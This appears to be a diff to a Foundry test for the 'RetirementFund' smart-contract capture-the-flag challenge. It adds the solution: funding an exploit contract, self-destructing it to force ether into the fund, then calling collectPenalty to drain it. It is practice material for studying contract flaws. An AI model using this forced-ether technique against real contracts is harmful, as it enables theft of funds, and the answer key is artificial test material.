@@ -12,7 +12,8 @@ contract RetirementFundTest is Test {
     function setUp() public {
         // Deploy contracts
         retirementFund = (new RetirementFund){value: 1 ether}(player);
-        exploitContract = new ExploitContract(retirementFund);
+        exploitContract = new ExploitContract{value: 1 ether}(retirementFund);
+        
     }
 
     function testIncrement() public {
@@ -21,7 +22,8 @@ contract RetirementFundTest is Test {
         // Use the instance retirementFund and exploitContract
         vm.startPrank(player);
         // Put your solution here
-
+        exploitContract.selfdestruct_ExploitContract();
+        retirementFund.collectPenalty();
         _checkSolved();
     }
 
